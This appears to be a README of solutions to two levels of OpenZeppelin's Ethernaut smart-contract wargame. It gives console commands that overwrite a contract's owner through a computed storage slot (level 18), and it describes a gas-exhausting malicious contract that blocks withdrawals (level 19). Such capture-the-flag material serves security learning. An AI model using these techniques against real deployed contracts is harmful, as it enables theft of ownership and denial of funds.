# Ethernaut-Solutions

Solutions to some of Openzeppelins's Ethernaut Challenges


Level 18.

Steps to pass the level: 
1. Run the attached contract's one() function on Remix and copy the value stored in the variable.
2. run the following commands : 
await contract.make_contact()
await contract.retract();
await contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938', '0x000000000000000000000000318Edb8407bc022556989429EAC679F1e4001B5c');


Level 19

Simply use up all the gas when sending eth to partner. No gas is left for a transfer to owner in the end. 
Steps to pass the level:
1. Deploy the malicious contract
2. Call Level 19's withdraw function()
3. Submit.
